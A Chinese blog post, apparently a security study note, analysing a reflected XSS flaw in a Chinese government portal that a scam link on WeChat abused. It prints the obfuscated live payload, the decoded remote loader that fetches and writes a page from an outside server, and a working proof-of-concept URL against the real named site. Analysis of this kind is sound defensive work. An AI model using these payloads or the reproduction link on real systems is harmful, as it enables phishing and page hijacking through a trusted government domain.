---
title: 政务网漏洞
categories:
  - study
  - web
tags: web
---

### 漏洞发现

朋友圈看到有骗人分享，链接是 `gov.cn`，通过政务网做跳板，绕过微信备案风控。

![朋友圈](./1.jpg)

### 漏洞分析

抓包溯源链接为

```
https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22%3B%7D%29%25%318%3Bi2%3D%27bjk%27%3Ba%3D%7B%27l%27%3Athis%2C%27k%27%3A%27%5C163etTimeout%27%2C%27r%27%3A%27a%27%2C%27t%27%3A%27%5C164o%5C142%27%7D%3Ba.l%5Ba.k%5D%28a.l%5Ba.r%2Ba.t%5D%28i2%2B%279ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8%2Fd3g9Jyk%3D%27%2C1%29%29%25%318%3B%24%28function%28%29%20%7Bvar%20orgCode%20%3D%20%22&gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635
```

通过 `decodeURIComponent` 获取得

```
`https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=";})%18;i2='bjk';a={'l':this,'k':'\\163etTimeout','r':'a','t':'\\164o\\142'};a.l[a.k](a.l[a.r+a.t](i2+'9ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8/d3g9Jyk=',1))%18;$(function() {var orgCode = "&gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635`
```

一眼 `orgCode` 接口未限制，可以任意执行 js。

![漏洞发现](./2.jpg)

### 代码分析

拆解分析后得知，
``
"n9=document\r\nn9.documentElement.hidden='1'\r\nn9.title='Loading...'\r\nimport('//v2load.oss-cn-shanghai.aliyuncs.com/hz15.js???wx=')"

``
![漏洞分析](./3.jpg)

注入后通过 `http://v2load.oss-cn-shanghai.aliyuncs.com/hz15.js???wx=` 载入远程代码

```
document.title="Loading...";document.documentElement.hidden=1;
(function(){
    var rmd = Math.random().toString(36).substr(2,7);
    var geUrl='//47.100.4.56/'+rmd+'?ref='+encodeURIComponent(location.href.split('#')[0]);
    var xhr=new XMLHttpRequest;xhr.onload=function(){var onhash=window.onhashchange;var h=xhr.responseText;var a=document.open("text/html","replace");a.write(h);a.close();window.onhashchange=onhash};
    xhr.open("GET",geUrl,!0);xhr.send();
})();
```

最终载入 `47.100.4.56` (阿里云上海) 服务器上的页面

尝试在 `orgCode` 带入不同入参后确认后端无任何过滤，直接返回前端输入导致漏洞

![漏洞尝试](./4.jpg)

### 漏洞复现

所以可以通过构造字符串执行任意代码。
例如以下链接，弹出 `株洲公安`，并跳转 `株洲市公安局官网`

```
https://gzkfq.jxzwfww.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22;alert(%27%E6%A0%AA%E6%B4%B2%E5%85%AC%E5%AE%89%27)%3Bwindow.location.href%3D%22http%3A%2F%2Fgaj.zhuzhou.gov.cn
```
